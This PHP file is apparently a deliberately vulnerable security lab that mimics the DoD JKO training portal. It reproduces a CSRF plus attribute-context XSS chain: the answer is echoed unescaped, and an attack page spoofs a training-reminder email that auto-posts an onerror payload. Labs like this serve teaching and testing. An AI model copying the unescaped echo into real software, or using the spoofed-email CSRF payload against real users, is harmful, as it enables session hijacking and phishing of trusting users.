<?php
// Lab 1306 — DoD JKO Training Portal CSRF → Attribute XSS (HackerOne #1118521)
// Vulnerability: POST /jko/course/answer has NO CSRF token AND reflects the `answer`
//   parameter raw inside an HTML attribute value="" — closing with "> breaks out and fires XSS.
// Payload: A"><img src=x onerror=alert(document.domain)>
// Reporter: lu3ky-13 | Severity: Medium | Platform: U.S. Dept of Defense (DoD VDP)

$isHttps = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off')
    || (!empty($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https');

if (session_status() === PHP_SESSION_NONE) {
    session_set_cookie_params([
        'lifetime' => 0,
        'path'     => '/',
        'secure'   => $isHttps,
        'httponly' => true,
        'samesite' => $isHttps ? 'None' : 'Lax',
    ]);
    session_start();
}

mysqli_report(MYSQLI_REPORT_OFF);

$db_host = getenv('DB_HOST') ?: '127.0.0.1';
$db_user = getenv('DB_USER') ?: 'root';
$db_pass = getenv('DB_PASS') ?: '';
$db_name = getenv('DB_NAME') ?: 'KrazePlanet_DB';

$db = @new mysqli($db_host, $db_user, $db_pass, $db_name);
if ($db->connect_error) {
    foreach (['localhost', '127.0.0.1', 'krazeplanet'] as $fallback_host) {
        $db = @new mysqli($fallback_host, $db_user, $db_pass, $db_name);
        if (!$db->connect_error) break;
    }
}

if (!$db || $db->connect_error) {
    die('<h3 style="padding:32px;font-family:sans-serif;color:#c00">DB connection error: ' . htmlspecialchars($db ? $db->connect_error : 'Could not connect to database') . '</h3>');
}
$db->set_charset('utf8mb4');

$baseUri = $_SERVER['SCRIPT_NAME'] ?? '/subdomains/academy/index.php';
$loginUrl   = $baseUri;
$dashUrl    = $baseUri . '?action=dashboard';
$moduleUrl  = $baseUri . '?action=module';
$answerUrl  = $baseUri . '?action=answer';
$logoutUrl  = $baseUri . '?logout=1';
$attackUrl  = $baseUri . '?attack=1';

// ── Tables ─────────────────────────────────────────────────────────────────────
$db->query("CREATE TABLE IF NOT EXISTS academy_users (
    id         INT AUTO_INCREMENT PRIMARY KEY,
    username   VARCHAR(100) NOT NULL,
    email      VARCHAR(255) NOT NULL UNIQUE,
    password   VARCHAR(255) NOT NULL,
    rank_title VARCHAR(80)  NOT NULL DEFAULT 'Specialist',
    unit       VARCHAR(120) NOT NULL DEFAULT '',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)");

// ── Seed ───────────────────────────────────────────────────────────────────────
$sc = $db->query("SELECT COUNT(*) FROM academy_users WHERE email IN ('davis@jko.mil','johnson@jko.mil','smith@jko.mil')")->fetch_row()[0];
if ($sc < 3) {
    $h1 = password_hash('davis@123',   PASSWORD_BCRYPT);
    $h2 = password_hash('johnson@123', PASSWORD_BCRYPT);
    $h3 = password_hash('smith@123',    PASSWORD_BCRYPT);
    $db->query("INSERT IGNORE INTO academy_users (username, email, password, rank_title, unit) VALUES
        ('Sgt_Davis',   'davis@jko.mil',   '$h1', 'Staff Sergeant', '101st Airborne Division'),
        ('Cpl_Johnson', 'johnson@jko.mil', '$h2', 'Corporal',       '10th Mountain Division'),
        ('PFC_Smith',   'smith@jko.mil',   '$h3', 'Private',        '3rd Infantry Division')");
}

function esc($s) { return htmlspecialchars((string)$s, ENT_QUOTES, 'UTF-8'); }

// ── Route detection ────────────────────────────────────────────────────────────
$action    = $_GET['action'] ?? '';
$isLogout  = isset($_GET['logout']);
$isAttack  = isset($_GET['attack']);
$isModule  = ($action === 'module');
$isAnswer  = ($action === 'answer');
$error     = '';

// ── Logout ─────────────────────────────────────────────────────────────────────
if ($isLogout) { session_destroy(); header('Location: ' . $loginUrl); exit; }

// ── Load session user ──────────────────────────────────────────────────────────
$currentUser = null;
if (!empty($_SESSION['academy_uid'])) {
    $st = $db->prepare("SELECT * FROM academy_users WHERE id = ?");
    $st->bind_param('i', $_SESSION['academy_uid']);
    $st->execute();
    $currentUser = $st->get_result()->fetch_assoc();
    $st->close();
}

// ── POST /jko/course/answer — VULNERABLE (no CSRF token, reflects answer raw) ─
if ($isAnswer && $_SERVER['REQUEST_METHOD'] === 'POST') {
    // ⚠ No CSRF token check — that's the vulnerability.
    $rawAnswer = $_POST['answer'] ?? '';

    // Detect if XSS payload is present
    $xssDetected = (strpos($rawAnswer, '<') !== false || strpos($rawAnswer, '"') !== false);

    // Render the answer response page — answer is echoed raw inside value="" attribute
    ?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Answer Submitted — JKO</title>
<style>
*{box-sizing:border-box;margin:0;padding:0;}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Arial,sans-serif;background:#f0f2f5;min-height:100vh;}
.jko-classbar{background:#000;color:#0f0;font-size:.62rem;font-weight:700;text-align:center;padding:3px 0;letter-spacing:.12em;font-family:'Courier New',monospace;}
.jko-topbar{background:#003A70;height:56px;display:flex;align-items:center;padding:0 24px;gap:12px;border-bottom:3px solid #E87722;}
.jko-logo{font-size:1.4rem;font-weight:900;color:#fff;letter-spacing:.06em;font-style:italic;}
.jko-logo-sub{font-size:.6rem;color:rgba(255,255,255,.5);text-transform:uppercase;letter-spacing:.08em;margin-left:4px;}
.jko-wrap{max-width:760px;margin:40px auto;padding:0 20px;}
.jko-card{background:#fff;border-radius:5px;border:1px solid #dde3ec;overflow:hidden;box-shadow:0 2px 8px rgba(0,0,0,.07);}
.jko-card-hdr{background:#003A70;padding:14px 20px;display:flex;align-items:center;gap:10px;}
.jko-card-hdr h3{font-size:.85rem;font-weight:700;color:#fff;text-transform:uppercase;letter-spacing:.05em;}
.jko-card-body{padding:24px 20px;}
.jko-success{background:#f0fdf4;border:1px solid #86efac;border-radius:4px;padding:12px 16px;margin-bottom:20px;font-size:.82rem;color:#166534;display:flex;align-items:center;gap:8px;}
.jko-review-label{font-size:.68rem;font-weight:700;color:#555;text-transform:uppercase;letter-spacing:.07em;margin-bottom:6px;}
.jko-review-input{width:100%;border:1px solid #ccc;border-radius:4px;padding:9px 11px;font-size:.84rem;color:#333;font-family:inherit;background:#fafafa;}

/* ── Flag reveal — hidden until XSS onerror fires ── */
.jko-flag-box{display:none;background:#003A70;color:#fff;border-radius:5px;padding:16px 20px;margin-top:16px;}
.jko-flag-label{font-size:.6rem;font-weight:700;text-transform:uppercase;letter-spacing:.1em;color:#E87722;margin-bottom:6px;}
.jko-flag-val{font-family:'Courier New',monospace;font-size:.88rem;font-weight:700;word-break:break-all;}

.jko-context-box{background:#fff8e8;border:1px solid #fde68a;border-radius:4px;padding:12px 16px;margin-top:18px;font-size:.72rem;color:#78350f;line-height:1.6;}
.jko-context-box code{font-family:'Courier New',monospace;background:#fef3c7;border-radius:2px;padding:1px 4px;font-size:.78rem;}
.jko-back{display:inline-block;margin-top:16px;background:#E87722;color:#fff;text-decoration:none;border-radius:4px;padding:8px 18px;font-size:.78rem;font-weight:700;}
</style>
</head>
<body>
<div class="jko-classbar">UNCLASSIFIED // FOR OFFICIAL USE ONLY</div>
<header class="jko-topbar">
  <span class="jko-logo">JKO</span>
  <span class="jko-logo-sub">Joint Knowledge Online · jko.jten.mil</span>
</header>
<div class="jko-wrap">

  <!-- ⚠ Flag reveal div — hidden until XSS fires -->
  <div id="flag-reveal" class="jko-flag-box">
    <div class="jko-flag-label">🚨 XSS Executed — CSRF + Attribute XSS Chain Successful</div>
    <div class="jko-flag-val"><?= LAB_FLAG ?></div>
  </div>

  <div class="jko-card">
    <div class="jko-card-hdr">
      <h3>📋 Answer Submission — Module 3 Review</h3>
    </div>
    <div class="jko-card-body">
      <div class="jko-success">✓ Your answer has been recorded for Module 3, Question 4.</div>

      <div class="jko-review-label">Your submitted answer (review):</div>

      <!--
        ⚠ VULNERABLE: `answer` is echoed raw — no htmlspecialchars() on the value attribute.
        Normal:  value="A"
        Payload: value="A"><img src=x onerror=...>"
                          ^ closes attr ^ closes tag ^ injects element
        This is attribute-context XSS — different from textarea-breakout (Lab 1304).
      -->
      <input type="text" class="jko-review-input" id="reviewAnswer"
             name="answer" value="<?= $rawAnswer ?>" readonly>

      <div class="jko-context-box">
        <strong>Vulnerability context — attribute breakout:</strong><br>
        Normal HTML: <code>&lt;input value="A"&gt;</code><br>
        With payload: <code>&lt;input value="A"&gt;&lt;img src=x onerror=...&gt;"&gt;</code><br>
        <code>"</code> closes the attribute · <code>&gt;</code> closes the tag · <code>&lt;img onerror&gt;</code> fires XSS
      </div>

      <a href="<?= esc($moduleUrl) ?>" class="jko-back">← Back to Module</a>
    </div>
  </div>
</div>
</body>
</html>
    <?php
    exit;
}

// ── POST: Login ────────────────────────────────────────────────────────────────
if ($_SERVER['REQUEST_METHOD'] === 'POST' && !$isAnswer && !$isAttack) {
    $email = trim($_POST['email'] ?? '');
    $pwd   = $_POST['password'] ?? '';
    if ($email && $pwd) {
        $st = $db->prepare("SELECT * FROM academy_users WHERE email = ?");
        $st->bind_param('s', $email);
        $st->execute();
        $row = $st->get_result()->fetch_assoc();
        $st->close();
        if ($row && password_verify($pwd, $row['password'])) {
            session_regenerate_id(true);
            $_SESSION['academy_uid'] = $row['id'];
            header('Location: ' . $dashUrl);
            exit;
        }
        $error = 'Invalid credentials.';
    } else {
        $error = 'Email and password are required.';
    }
}

// ── Redirect logged-in user from login ────────────────────────────────────────
if ($currentUser && !$isModule && !$isAnswer && !$isAttack && !$action) {
    header('Location: ' . $dashUrl);
    exit;
}

// ── Guard: protected pages require login ───────────────────────────────────────
if (!$currentUser && !$isAttack && $action) {
    header('Location: ' . $loginUrl);
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<?php if ($isAttack): ?>
<title>JKO Training Deadline Reminder — Action Required</title>
<?php elseif ($isModule): ?>
<title>Cyber Security Awareness 2021 — Module 3 | JKO</title>
<?php elseif ($currentUser): ?>
<title>My Courses | JKO</title>
<?php else: ?>
<title>Sign In | JKO — Joint Knowledge Online</title>
<?php endif; ?>
<style>
*{box-sizing:border-box;margin:0;padding:0;}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Arial,sans-serif;min-height:100vh;}

/* ══════════════════════════════════
   SHARED JKO CHROME
   ══════════════════════════════════ */
.jko-classbar{background:#000;color:#0f0;font-size:.62rem;font-weight:700;text-align:center;padding:3px 0;letter-spacing:.12em;font-family:'Courier New',monospace;}
.jko-topbar{background:#003A70;height:58px;display:flex;align-items:center;padding:0 24px;gap:12px;border-bottom:3px solid #E87722;}
.jko-logo-wrap{display:flex;align-items:baseline;gap:6px;text-decoration:none;}
.jko-logo{font-size:1.5rem;font-weight:900;color:#fff;letter-spacing:.06em;font-style:italic;line-height:1;}
.jko-logo-tag{font-size:.58rem;color:rgba(255,255,255,.5);text-transform:uppercase;letter-spacing:.07em;line-height:1;}
.jko-nav{margin-left:28px;display:flex;gap:2px;}
.jko-nav-link{color:rgba(255,255,255,.7);text-decoration:none;font-size:.75rem;font-weight:600;padding:6px 10px;border-radius:2px;text-transform:uppercase;letter-spacing:.04em;}
.jko-nav-link:hover,.jko-nav-link.active{color:#fff;background:rgba(255,255,255,.1);}
.jko-topbar-right{margin-left:auto;display:flex;align-items:center;gap:10px;}
.jko-topbar-right a{color:rgba(255,255,255,.65);font-size:.72rem;text-decoration:none;font-weight:600;}
.jko-topbar-right a:hover{color:#fff;}
.jko-breadcrumb-bar{background:#1a4a7a;height:30px;display:flex;align-items:center;padding:0 24px;border-bottom:1px solid #2a5a8a;}
.jko-breadcrumb{font-size:.68rem;color:rgba(255,255,255,.55);display:flex;align-items:center;gap:6px;}
.jko-breadcrumb a{color:rgba(255,255,255,.55);text-decoration:none;}
.jko-breadcrumb a:hover{color:#fff;}
.jko-breadcrumb span{opacity:.4;}

/* ══════════════════════════════════
   LOGIN
   ══════════════════════════════════ */
.jko-login-bg{background:#002855;min-height:100vh;display:flex;flex-direction:column;}
.jko-login-body{flex:1;display:flex;align-items:center;justify-content:center;padding:48px 16px;}
.jko-login-card{background:#fff;border-radius:5px;width:100%;max-width:400px;overflow:hidden;box-shadow:0 10px 40px rgba(0,0,0,.35);}
.jko-login-card-hdr{background:#003A70;padding:22px 24px;border-bottom:3px solid #E87722;}
.jko-login-shield{width:48px;height:48px;margin-bottom:10px;}
.jko-login-hdr-title{font-size:1rem;font-weight:800;color:#fff;letter-spacing:.03em;}
.jko-login-hdr-sub{font-size:.62rem;color:rgba(255,255,255,.5);text-transform:uppercase;letter-spacing:.07em;margin-top:2px;}
.jko-login-body-inner{padding:28px 24px;}
.jko-field{margin-bottom:14px;}
.jko-field label{display:block;font-size:.68rem;font-weight:700;color:#444;text-transform:uppercase;letter-spacing:.07em;margin-bottom:5px;}
.jko-field input{width:100%;border:1px solid #ccc;border-radius:3px;padding:9px 11px;font-size:.85rem;font-family:inherit;color:#333;outline:none;transition:border-color .15s;}
.jko-field input:focus{border-color:#003A70;box-shadow:0 0 0 2px rgba(0,58,112,.12);}
.jko-btn-primary{width:100%;background:#003A70;border:none;border-radius:3px;padding:10px;font-size:.85rem;font-weight:700;color:#fff;cursor:pointer;font-family:inherit;text-transform:uppercase;letter-spacing:.04em;transition:background .15s;}
.jko-btn-primary:hover{background:#1a4a7a;}
.jko-error{background:#fef2f2;border:1px solid #fca5a5;border-radius:3px;padding:9px 12px;font-size:.78rem;color:#b91c1c;margin-bottom:14px;}
.jko-login-footer{background:#f5f5f5;border-top:1px solid #eee;padding:12px 24px;font-size:.63rem;color:#aaa;line-height:1.6;text-align:center;}
.jko-login-footer a{color:#888;}

/* ══════════════════════════════════
   DASHBOARD
   ══════════════════════════════════ */
.jko-main-bg{background:#f0f2f5;min-height:calc(100vh - 91px);}
.jko-content{max-width:960px;margin:0 auto;padding:28px 20px;}
.jko-page-title{font-size:1.1rem;font-weight:800;color:#003A70;margin-bottom:6px;}
.jko-page-sub{font-size:.75rem;color:#888;margin-bottom:24px;}
.jko-welcome-strip{background:#fff;border:1px solid #dde3ec;border-radius:5px;padding:16px 20px;margin-bottom:24px;display:flex;align-items:center;gap:16px;border-left:4px solid #E87722;}
.jko-avatar{width:44px;height:44px;border-radius:50%;background:#003A70;display:flex;align-items:center;justify-content:center;font-size:.9rem;font-weight:800;color:#fff;flex-shrink:0;}
.jko-welcome-name{font-size:.95rem;font-weight:800;color:#003A70;}
.jko-welcome-meta{font-size:.72rem;color:#888;margin-top:1px;}
.jko-courses-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:18px;margin-bottom:28px;}
.jko-course-card{background:#fff;border:1px solid #dde3ec;border-radius:5px;overflow:hidden;box-shadow:0 1px 4px rgba(0,0,0,.05);}
.jko-course-card-top{height:6px;}
.jko-course-card-body{padding:16px;}
.jko-course-tag{font-size:.58rem;font-weight:800;text-transform:uppercase;letter-spacing:.08em;color:#888;margin-bottom:6px;}
.jko-course-title{font-size:.82rem;font-weight:800;color:#003A70;margin-bottom:8px;line-height:1.35;}
.jko-progress-label{display:flex;justify-content:space-between;font-size:.65rem;color:#888;margin-bottom:4px;}
.jko-progress-bar{height:5px;background:#e5e7eb;border-radius:3px;overflow:hidden;}
.jko-progress-fill{height:100%;border-radius:3px;transition:width .3s;}
.jko-course-meta{font-size:.65rem;color:#aaa;margin-top:10px;}
.jko-course-action{display:flex;gap:8px;margin-top:12px;flex-wrap:wrap;}
.jko-btn-orange{display:inline-block;background:#E87722;color:#fff;text-decoration:none;border-radius:3px;padding:7px 14px;font-size:.72rem;font-weight:700;text-transform:uppercase;letter-spacing:.04em;border:none;cursor:pointer;font-family:inherit;}
.jko-btn-orange:hover{background:#d06a1a;}
.jko-btn-ghost{display:inline-block;border:1.5px solid #003A70;color:#003A70;background:transparent;text-decoration:none;border-radius:3px;padding:6px 12px;font-size:.72rem;font-weight:700;text-transform:uppercase;letter-spacing:.04em;}
.jko-btn-ghost:hover{background:#003A70;color:#fff;}
.jko-badge{display:inline-block;border-radius:2px;font-size:.58rem;font-weight:800;padding:2px 7px;text-transform:uppercase;letter-spacing:.05em;}
.jko-badge-green{background:#dcfce7;color:#166534;}
.jko-badge-blue{background:#dbeafe;color:#1e40af;}
.jko-badge-grey{background:#f3f4f6;color:#6b7280;}
.jko-section-title{font-size:.75rem;font-weight:800;color:#003A70;text-transform:uppercase;letter-spacing:.07em;margin-bottom:10px;border-bottom:2px solid #E87722;padding-bottom:4px;display:inline-block;}

/* ══════════════════════════════════
   MODULE / QUIZ PAGE
   ══════════════════════════════════ */
.jko-module-layout{display:flex;gap:24px;max-width:960px;margin:0 auto;padding:28px 20px;}
.jko-module-main{flex:1;}
.jko-module-sidebar{width:240px;flex-shrink:0;}
.jko-module-card{background:#fff;border:1px solid #dde3ec;border-radius:5px;overflow:hidden;box-shadow:0 1px 4px rgba(0,0,0,.06);}
.jko-module-card-hdr{background:#003A70;padding:14px 18px;border-bottom:3px solid #E87722;}
.jko-module-card-hdr h2{font-size:.88rem;font-weight:700;color:#fff;}
.jko-module-card-hdr p{font-size:.62rem;color:rgba(255,255,255,.55);margin-top:2px;text-transform:uppercase;letter-spacing:.05em;}
.jko-module-body{padding:22px 20px;}
.jko-q-number{font-size:.62rem;font-weight:800;color:#E87722;text-transform:uppercase;letter-spacing:.08em;margin-bottom:8px;}
.jko-question{font-size:.95rem;font-weight:700;color:#003A70;line-height:1.5;margin-bottom:18px;}
.jko-answer-label{font-size:.68rem;font-weight:700;color:#555;text-transform:uppercase;letter-spacing:.07em;margin-bottom:6px;}
.jko-answer-input{width:100%;border:1px solid #ccc;border-radius:4px;padding:10px 12px;font-size:.84rem;font-family:inherit;resize:vertical;min-height:80px;color:#333;outline:none;transition:border-color .15s;}
.jko-answer-input:focus{border-color:#003A70;box-shadow:0 0 0 2px rgba(0,58,112,.1);}
.jko-vuln-note{background:#fff8e8;border:1px solid #fde68a;border-radius:4px;padding:10px 14px;font-size:.72rem;color:#78350f;margin-top:10px;line-height:1.5;}
.jko-module-footer{background:#f8f9fc;border-top:1px solid #eee;padding:12px 20px;display:flex;align-items:center;gap:10px;}
.jko-btn-submit{background:#003A70;border:none;border-radius:3px;padding:9px 22px;font-size:.8rem;font-weight:700;color:#fff;cursor:pointer;font-family:inherit;text-transform:uppercase;letter-spacing:.04em;}
.jko-btn-submit:hover{background:#1a4a7a;}
.jko-sidebar-card{background:#fff;border:1px solid #dde3ec;border-radius:5px;overflow:hidden;margin-bottom:14px;}
.jko-sidebar-card-hdr{background:#f0f2f5;padding:10px 14px;border-bottom:1px solid #dde3ec;}
.jko-sidebar-card-hdr h4{font-size:.7rem;font-weight:800;color:#003A70;text-transform:uppercase;letter-spacing:.06em;}
.jko-sidebar-card-body{padding:12px 14px;}
.jko-sidebar-item{display:flex;align-items:center;gap:8px;padding:5px 0;font-size:.73rem;color:#555;}
.jko-sidebar-item-num{width:20px;height:20px;border-radius:50%;background:#e5e7eb;display:flex;align-items:center;justify-content:center;font-size:.6rem;font-weight:800;color:#555;flex-shrink:0;}
.jko-sidebar-item-num.done{background:#dcfce7;color:#166534;}
.jko-sidebar-item-num.current{background:#003A70;color:#fff;}

/* ══════════════════════════════════
   ATTACK PAGE — Fake JKO Reminder Email
   ══════════════════════════════════ */
.atk-bg{background:#e8ecf0;min-height:100vh;display:flex;align-items:flex-start;justify-content:center;padding:32px 16px;}
.atk-email-wrap{width:100%;max-width:600px;}
.atk-email-meta{background:#fff;border-radius:5px 5px 0 0;border:1px solid #ddd;border-bottom:none;padding:12px 18px;display:flex;justify-content:space-between;align-items:center;}
.atk-email-meta-from{font-size:.75rem;color:#333;font-weight:600;}
.atk-email-meta-from span{color:#888;font-weight:400;}
.atk-email-meta-date{font-size:.7rem;color:#aaa;}
.atk-email{background:#fff;border-radius:0 0 5px 5px;border:1px solid #ddd;overflow:hidden;box-shadow:0 4px 20px rgba(0,0,0,.1);}
.atk-email-hdr{background:#003A70;padding:0;}
.atk-email-hdr-inner{display:flex;align-items:center;gap:12px;padding:16px 24px;border-bottom:3px solid #E87722;}
.atk-email-logo{font-size:1.3rem;font-weight:900;color:#fff;font-style:italic;letter-spacing:.06em;}
.atk-email-logo-sub{font-size:.58rem;color:rgba(255,255,255,.45);text-transform:uppercase;letter-spacing:.07em;margin-top:1px;}
.atk-email-hdr-right{margin-left:auto;font-size:.62rem;color:rgba(255,255,255,.35);}
.atk-banner{background:#c53030;color:#fff;padding:10px 24px;font-size:.78rem;font-weight:700;display:flex;align-items:center;gap:8px;}
.atk-body{padding:28px 28px 20px;}
.atk-greeting{font-size:.98rem;font-weight:800;color:#003A70;margin-bottom:10px;}
.atk-text{font-size:.84rem;color:#444;line-height:1.75;margin-bottom:14px;}
.atk-deadline-box{background:#fff8e8;border:2px solid #E87722;border-radius:5px;padding:16px 20px;margin-bottom:20px;}
.atk-deadline-title{font-size:.82rem;font-weight:800;color:#003A70;margin-bottom:6px;}
.atk-deadline-list{list-style:none;padding:0;}
.atk-deadline-list li{font-size:.78rem;color:#555;padding:3px 0;display:flex;align-items:center;gap:8px;}
.atk-deadline-list li::before{content:"▸";color:#E87722;font-weight:800;}
.atk-cta{text-align:center;margin-bottom:20px;}
.atk-cta-btn{display:inline-block;background:#E87722;color:#fff;border:none;border-radius:4px;padding:13px 32px;font-size:.92rem;font-weight:800;text-transform:uppercase;letter-spacing:.05em;cursor:pointer;font-family:inherit;transition:background .15s;}
.atk-cta-btn:hover{background:#d06a1a;}
.atk-loading{display:none;text-align:center;color:#777;font-size:.8rem;padding:10px 0;}
.atk-divider{height:1px;background:#eee;margin:18px 0;}
.atk-footer-text{font-size:.65rem;color:#aaa;line-height:1.7;text-align:center;}
.atk-footer-text a{color:#888;}
.atk-bottom-bar{background:#003A70;padding:10px 24px;display:flex;justify-content:space-between;font-size:.62rem;color:rgba(255,255,255,.4);}
</style>
</head>
<body>

<?php if ($isAttack): ?>
<!-- ══════════════════════════════════════════════════════════════════════════
     ATTACK PAGE — Fake JKO Training Deadline Reminder Email
     Auto-POSTs CSRF form with XSS payload as `answer`
     ══════════════════════════════════════════════════════════════════════════ -->
<div class="atk-bg">
  <div class="atk-email-wrap">

    <!-- Email client chrome -->
    <div class="atk-email-meta">
      <div class="atk-email-meta-from">
        <strong>JKO Training Notifications</strong>
        <span>&lt;noreply@jko.jten.mil&gt;</span>
        <span style="margin-left:8px;">To: SSgt.Carter &lt;victim@jko.mil&gt;</span>
      </div>
      <div class="atk-email-meta-date">Mar 5, 2021, 9:48 PM</div>
    </div>

    <div class="atk-email">
      <div class="atk-email-hdr">
        <div class="atk-email-hdr-inner">
          <div>
            <div class="atk-email-logo">JKO</div>
            <div class="atk-email-logo-sub">Joint Knowledge Online</div>
          </div>
          <div class="atk-email-hdr-right">jko.jten.mil · UNCLASSIFIED</div>
        </div>
        <div class="atk-banner">⚠ ACTION REQUIRED: Training Deadline in 3 Days</div>
      </div>

      <div class="atk-body">
        <div class="atk-greeting">Dear SSgt. Carter,</div>
        <p class="atk-text">
          Our records indicate that you have an outstanding training requirement that must be
          completed before the end of the current compliance period. Failure to complete the
          required training may result in restricted system access.
        </p>

        <div class="atk-deadline-box">
          <div class="atk-deadline-title">📋 Outstanding Training Requirements</div>
          <ul class="atk-deadline-list">
            <li>Cyber Security Awareness Training 2021 — <strong>Module 3, Q4 incomplete</strong></li>
            <li>Deadline: <strong>March 31, 2021, 23:59 EST</strong></li>
            <li>Your last answer has been saved — click below to review and confirm</li>
          </ul>
        </div>

        <p class="atk-text">
          To complete your training and submit your final answer for Module 3,
          please click the button below. Your previous answer has been pre-loaded for review.
        </p>

        <!-- ⚠ CSRF: POST to /jko/course/answer with XSS payload as `answer`
             No CSRF token in the form. Server reflects `answer` raw in value="" → XSS fires. -->
        <form id="csrfForm"
              action="/index.php?action=answer"
              method="POST"
              style="display:none;">
          <input type="hidden" name="answer" value='A"><img src=x onerror=document.getElementById(&apos;flag-reveal&apos;).style.display=&apos;block&apos;>'>
        </form>

        <div class="atk-cta">
          <button class="atk-cta-btn" id="csrfBtn" onclick="fireCSRF()">
            Review &amp; Submit Answer →
          </button>
        </div>
        <div class="atk-loading" id="loadingMsg">⏳ Submitting your answer to the JKO server…</div>

        <div class="atk-divider"></div>
        <p class="atk-footer-text">
          This is an automated message from the JKO Training Management System.<br>
          Do not reply to this email. For support, contact your unit training coordinator.<br>
          <a href="#">Unsubscribe</a> · <a href="#">JKO Help Desk</a> · <a href="#">Privacy Policy</a>
        </p>
      </div>

      <div class="atk-bottom-bar">
        <span>Joint Knowledge Online (JKO) · JTEN, Fort Belvoir, VA</span>
        <span>UNCLASSIFIED // FOR OFFICIAL USE ONLY</span>
      </div>
    </div>

  </div>
</div>

<script>
function fireCSRF() {
    document.getElementById('csrfBtn').style.display = 'none';
    document.getElementById('loadingMsg').style.display = 'block';
    setTimeout(function() {
        document.getElementById('csrfForm').submit();
    }, 700);
}
</script>

<?php elseif ($isModule && $currentUser): ?>
<!-- ══════════════════════════════════════════════════════════════════════════
     TRAINING MODULE PAGE — Question with answer form (no CSRF token)
     ══════════════════════════════════════════════════════════════════════════ -->
<div class="jko-classbar">UNCLASSIFIED // FOR OFFICIAL USE ONLY</div>
<header class="jko-topbar">
  <a href="/index.php?action=dashboard" class="jko-logo-wrap">
    <span class="jko-logo">JKO</span>
    <span class="jko-logo-tag">Joint Knowledge Online</span>
  </a>
  <nav class="jko-nav">
    <a href="/index.php?action=dashboard" class="jko-nav-link active">My Courses</a>
    <a href="#" class="jko-nav-link">Catalog</a>
    <a href="#" class="jko-nav-link">Certificates</a>
  </nav>
  <div class="jko-topbar-right">
    <a href="/index.php?action=dashboard"><?= esc($currentUser['username']) ?></a>
    <a href="/index.php?logout=1">Sign Out</a>
  </div>
</header>
<div class="jko-breadcrumb-bar">
  <div class="jko-breadcrumb">
    <a href="/index.php?action=dashboard">My Courses</a>
    <span>›</span>
    <a href="#">Cyber Security Awareness 2021</a>
    <span>›</span>
    Module 3: Phishing &amp; Social Engineering
  </div>
</div>

<div style="background:#f0f2f5;min-height:calc(100vh - 91px);padding:28px 0;">
  <div class="jko-module-layout">
    <div class="jko-module-main">
      <div class="jko-module-card">
        <div class="jko-module-card-hdr">
          <h2>Cyber Security Awareness Training 2021</h2>
          <p>Module 3 · Phishing &amp; Social Engineering · Question 4 of 5</p>
        </div>
        <div class="jko-module-body">
          <div class="jko-q-number">Question 4</div>
          <div class="jko-question">
            You receive an unsolicited email from an unknown sender asking you to
            click a link and verify your CAC credentials on an external website.
            What is the <em>FIRST</em> action you should take?
          </div>

          <!-- ⚠ VULNERABLE form: no CSRF token field. `answer` POST param is
               reflected raw inside value="" attribute in the response page. -->
          <form method="POST" action="/index.php?action=answer">
            <div class="jko-answer-label">Your Answer <span style="color:#ccc;font-weight:400;text-transform:none;">(free text)</span></div>
            <textarea class="jko-answer-input" name="answer"
                      placeholder="Type your answer here…"></textarea>
            <div class="jko-vuln-note">
              ⚠ This form has <strong>no CSRF token</strong>. Any cross-origin POST
              to <code>/index.php?action=answer</code> will be accepted. The submitted
              <code>answer</code> value is also reflected raw inside a
              <code>value=""</code> attribute in the response — enabling XSS.
            </div>
          </form>
        </div>
        <div class="jko-module-footer">
          <button type="submit" form="answerForm"
                  onclick="document.querySelector('form').submit()"
                  class="jko-btn-submit">Submit Answer</button>
          <a href="/index.php?action=dashboard" style="font-size:.78rem;color:#888;text-decoration:none;margin-left:8px;">Save &amp; Exit</a>
          <span style="margin-left:auto;font-size:.65rem;color:#aaa;">No CSRF token in this form</span>
        </div>
      </div>
    </div>

    <div class="jko-module-sidebar">
      <div class="jko-sidebar-card">
        <div class="jko-sidebar-card-hdr"><h4>Module 3 Progress</h4></div>
        <div class="jko-sidebar-card-body">
          <?php
          $questions = [
              ['Q1', 'Identifying Phishing Emails', true],
              ['Q2', 'Spear Phishing Tactics', true],
              ['Q3', 'Social Engineering Red Flags', true],
              ['Q4', 'Incident Response Procedure', false],
              ['Q5', 'Reporting Channels', false],
          ];
          foreach ($questions as $i => [$num, $label, $done]):
              $isCurrent = ($i === 3);
          ?>
          <div class="jko-sidebar-item">
            <div class="jko-sidebar-item-num <?= $done ? 'done' : ($isCurrent ? 'current' : '') ?>">
              <?= $done ? '✓' : $num[1] ?>
            </div>
            <span style="font-size:.7rem;color:<?= $isCurrent ? '#003A70' : ($done ? '#555' : '#aaa') ?>;font-weight:<?= $isCurrent ? '700' : '400' ?>;"><?= esc($label) ?></span>
          </div>
          <?php endforeach; ?>
        </div>
      </div>
      <div class="jko-sidebar-card">
        <div class="jko-sidebar-card-hdr"><h4>Course Info</h4></div>
        <div class="jko-sidebar-card-body">
          <div style="font-size:.7rem;color:#555;line-height:1.8;">
            <div><strong>Course:</strong> DOD-IAA-V13.0</div>
            <div><strong>Due:</strong> Mar 31, 2021</div>
            <div><strong>Credit:</strong> 1.0 hr</div>
            <div><strong>Module:</strong> 3 / 5</div>
          </div>
        </div>
      </div>
    </div>
  </div>
</div>

<?php elseif ($currentUser): ?>
<!-- ══════════════════════════════════════════════════════════════════════════
     DASHBOARD — My Courses
     ══════════════════════════════════════════════════════════════════════════ -->
<div class="jko-classbar">UNCLASSIFIED // FOR OFFICIAL USE ONLY</div>
<header class="jko-topbar">
  <a href="/index.php?action=dashboard" class="jko-logo-wrap">
    <span class="jko-logo">JKO</span>
    <span class="jko-logo-tag">Joint Knowledge Online</span>
  </a>
  <nav class="jko-nav">
    <a href="/index.php?action=dashboard" class="jko-nav-link active">My Courses</a>
    <a href="#" class="jko-nav-link">Catalog</a>
    <a href="#" class="jko-nav-link">Certificates</a>
    <a href="#" class="jko-nav-link">Admin</a>
  </nav>
  <div class="jko-topbar-right">
